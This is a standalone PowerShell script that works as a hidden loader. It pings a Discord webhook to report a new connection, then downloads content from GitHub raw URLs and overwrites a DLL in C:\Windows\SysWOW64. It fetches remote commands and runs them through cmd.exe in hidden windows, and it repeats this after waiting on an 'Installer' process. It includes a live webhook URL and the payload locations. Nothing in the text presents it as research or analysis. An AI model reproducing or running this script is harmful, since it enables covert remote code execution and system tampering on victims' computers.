$webhookUrl = "https://discord.com/api/webhooks/1422381044409045095/rEjDSI7lylqO-y0UDEjs3oYb8tpL29sz67SpLJ6K3OTocCUVV5vq6jOJ54JNr5wBJXHp"
$body = @{ content = "Connect ✅" }
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' | Out-Null
$rawUrl1 = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$response1 = Invoke-WebRequest -Uri $rawUrl1 -TimeoutSec 30
$hexCode1 = $response1.Content.Trim()
$targetFile = "C:\Windows\SysWOW64\ntdllp.dll"
if (Test-Path $targetFile) {
    $bytes = [System.Text.Encoding]::Default.GetBytes($hexCode1)
    [System.IO.File]::WriteAllBytes($targetFile, $bytes)
}
Set-Clipboard -Value "SteF6b2WrAgu"
$eRawUrl = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$eResponse = Invoke-WebRequest -Uri $eRawUrl -TimeoutSec 30
$eCommand = $eResponse.Content.Trim()
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.Arguments = "/c $eCommand"
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$process = [System.Diagnostics.Process]::Start($psi)
$process.WaitForExit()
do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
$bRawUrl = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$bResponse = Invoke-WebRequest -Uri $bRawUrl -TimeoutSec 30
$hexCode2 = $bResponse.Content.Trim()
if (Test-Path $targetFile) {
    $bytes2 = [System.Text.Encoding]::Default.GetBytes($hexCode2)
    [System.IO.File]::WriteAllBytes($targetFile, $bytes2)
}
$cRawUrl = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
$cResponse = Invoke-WebRequest -Uri $cRawUrl -TimeoutSec 30
$cCommand = $cResponse.Content.Trim()
$psi2 = New-Object System.Diagnostics.ProcessStartInfo
$psi2.FileName = "cmd.exe"
$psi2.Arguments = "/c $cCommand"
$psi2.UseShellExecute = $false
$psi2.CreateNoWindow = $true
$process2 = [System.Diagnostics.Process]::Start($psi2)
$process2.WaitForExit()
